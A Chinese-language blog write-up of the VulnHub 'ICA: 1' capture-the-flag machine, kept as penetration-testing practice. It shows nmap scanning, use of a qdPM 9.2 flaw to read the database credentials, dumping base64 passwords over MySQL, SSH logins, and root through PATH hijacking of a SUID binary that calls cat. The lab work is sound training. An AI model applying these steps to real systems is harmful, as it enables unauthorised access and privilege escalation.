---
title: vulnhub 做题 ICE:01
tags: [penetration]
date: 2024-10-14 00:00:00
categories: [penetration]
excerpt: day3
---


## vulnhub 做题 ICA: 1

### 扫描

```zsh
─$ nmap -p 1-65535 -sV 192.168.169.131
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 23:46 EDT
Nmap scan report for 192.168.169.131
Host is up (0.00020s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.48 ((Debian))
3306/tcp  open  mysql   MySQL 8.0.26
33060/tcp open  mysqlx?
1 service unrecognized despite returning data ..........
```

开了ssh和mysql，80的web是一个通过邮件登录的界面，显示这个软件叫做qdPM，版本是9.2

```zsh
qdPM 9.2 - Cross-site Request Forgery (CSRF)     php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)   php/webapps/50176.txt
```

第一个csrf的漏洞没看懂😭😭😭，第二个说是要访问这个网站的一个路径就能拿到sql的账号

```
The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download
```

这个yml里写了账号是qdpmadmin，密码是UcVQCMQk2STVeS6J

登录sql的时候还遇到了点问题，直接链接会报错`ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain`，然后搜了一下加个参数，`--ssl-mode=DISABLED`，又说没有这个参数，然后又试了一下`--skip-ssl`，居然好使了😶‍🌫️（但这个参数说是很旧版的参数）

> 然后我打开了qdpm这个数据库里一个叫attachments的表的时候，sql直接崩了，web也没了，只能重启靶机😢

然后tqdm里这个user的表是空的，其他的似乎也没什么有价值的信息，只能换一个数据库看看

staff这里存储了叫做用户和密码的表

```sql
MySQL [staff]> select * from login;
+------+---------+--------------------------+
| id   | user_id | password                 |
+------+---------+--------------------------+
|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
+------+---------+--------------------------+
5 rows in set (0.001 sec)

MySQL [staff]> select * from user;
+------+---------------+--------+---------------------------+
| id   | department_id | name   | role                      |
+------+---------------+--------+---------------------------+
|    1 |             1 | Smith  | Cyber Security Specialist |
|    2 |             2 | Lucas  | Computer Engineer         |
|    3 |             1 | Travis | Intelligence Specialist   |
|    4 |             1 | Dexter | Cyber Security Analyst    |
|    5 |             2 | Meyer  | Genetic Engineer          |
+------+---------------+--------+---------------------------+

```

密码显然是base64加密过后的，然后由于web是要用邮箱登录，肯定不是这个的密码，所以只能是开着的ssh密码，但是登陆时又遇到了问题（怎么这么多问题😅），最后去看了题解才知道，用户名要转换成小写😶‍🌫️😶‍🌫️😶‍🌫️

只有travis和dexter两个ssh能登陆的

```zsh
travis@debian:/home$ ls
dexter  travis
```

然后在travis的目录发现了一个flag
```zsh
travis@debian:/home/travis$ cat user.txt
ICA{Secret_Project}
```

而dexter的目录下有进一步的提示
```zsh
dexter@debian:~$ cat note.txt
It seems to me that there is a weakness while accessing the system.
As far as I know, the contents of executable files are partially viewable.
I need to find out if there is a vulnerability or not.
```

在opt下有一个 get_access 的程序，反汇编（至于怎么找到这里的，有的题解说是用`find / -perm -u=s 2>/dev/null`寻找能够以root权限执行的文件）

![](/img/pene/5.png)

可以通过替换cat可执行文件为/bin/bash来获取root权限，首先创建一个叫做cat的内容为/bin/bash的文本，然后chmod 777，然后添加到环境变量

```zsh
dexter@debian:/home/dexter$ export PATH=/home/dexter:$PATH
dexter@debian:/home/dexter$ echo $PATH
/home/dexter:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

保证他在/usr/bin前边就行。提权成功之后要删掉才能正常输出（也有说可以用more命令的）

```zsh
root@debian:/root# rm /home/dexter/cat
root@debian:/root# cat ./root.txt 
ICA{Next_Generation_Self_Renewable_Genetics}
```
